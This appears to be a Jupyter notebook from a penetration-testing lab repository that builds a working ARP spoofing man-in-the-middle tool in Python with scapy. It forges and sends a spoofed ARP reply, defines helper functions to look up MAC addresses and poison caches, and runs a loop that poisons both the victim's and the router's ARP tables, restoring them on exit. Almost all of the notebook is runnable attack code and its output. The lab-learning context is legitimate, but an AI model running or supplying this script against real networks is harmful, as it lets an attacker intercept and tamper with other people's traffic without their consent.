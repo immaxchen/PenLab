{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Crafting a fake ARP response packet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import scapy.all as scapy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "hwtype     : XShortField                         = 1               (1)\n",
      "ptype      : XShortEnumField                     = 2048            (2048)\n",
      "hwlen      : ByteField                           = 6               (6)\n",
      "plen       : ByteField                           = 4               (4)\n",
      "op         : ShortEnumField                      = 1               (1)\n",
      "hwsrc      : ARPSourceMACField                   = '08:00:27:74:17:d4' (None)\n",
      "psrc       : SourceIPField                       = '10.0.2.15'     (None)\n",
      "hwdst      : MACField                            = '00:00:00:00:00:00' ('00:00:00:00:00:00')\n",
      "pdst       : IPField                             = '0.0.0.0'       ('0.0.0.0')\n"
     ]
    }
   ],
   "source": [
    "scapy.ls(scapy.ARP())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "router_ip = '10.0.2.1'\n",
    "router_mac = '52:54:00:12:35:00'\n",
    "\n",
    "victim_ip = '10.0.2.4'\n",
    "victim_mac = '08:00:27:10:b8:d0'\n",
    "\n",
    "my_ip = '10.0.2.15'\n",
    "my_mac = '08:00:27:74:17:d4'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "###[ ARP ]### \n",
      "  hwtype    = 0x1\n",
      "  ptype     = 0x800\n",
      "  hwlen     = 6\n",
      "  plen      = 4\n",
      "  op        = is-at\n",
      "  hwsrc     = 08:00:27:74:17:d4\n",
      "  psrc      = 10.0.2.1\n",
      "  hwdst     = 08:00:27:10:b8:d0\n",
      "  pdst      = 10.0.2.4\n",
      "\n"
     ]
    }
   ],
   "source": [
    "packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=my_mac)\n",
    "packet.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ARP is at 08:00:27:74:17:d4 says 10.0.2.1'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "packet.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Sent 1 packets.\n"
     ]
    }
   ],
   "source": [
    "scapy.send(packet)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Crafting our ARP spoofing method"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_mac(ip):\n",
    "    arp = scapy.ARP(pdst=ip)\n",
    "    ether = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')\n",
    "    ans = scapy.srp(ether/arp, timeout=1, retry=10, verbose=False)[0]\n",
    "    if len(ans) > 0:\n",
    "        return ans[0][1].hwsrc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "10.0.2.4 => 08:00:27:10:b8:d0\n"
     ]
    }
   ],
   "source": [
    "victim_mac = get_mac(victim_ip)\n",
    "print(victim_ip + ' => ' + victim_mac)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "def arp_spoof(victim_ip, victim_mac, set_his_ip, to_this_mac):\n",
    "    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=set_his_ip, hwsrc=to_this_mac)\n",
    "    scapy.send(packet, verbose=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Sending packets ..\n",
      "[-] Quit\n"
     ]
    }
   ],
   "source": [
    "try:\n",
    "    # Poison\n",
    "    while True:\n",
    "        arp_spoof(victim_ip, victim_mac, router_ip, my_mac)\n",
    "        arp_spoof(router_ip, router_mac, victim_ip, my_mac)\n",
    "        time.sleep(1)\n",
    "        print('\\r[+] Sending packets . ', end='')\n",
    "        time.sleep(1)\n",
    "        print('\\r[+] Sending packets ..', end='')\n",
    "except KeyboardInterrupt:\n",
    "    # Cure\n",
    "    arp_spoof(victim_ip, victim_mac, router_ip, router_mac)\n",
    "    arp_spoof(router_ip, router_mac, victim_ip, victim_mac)\n",
    "    print('\\n[-] Quit')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
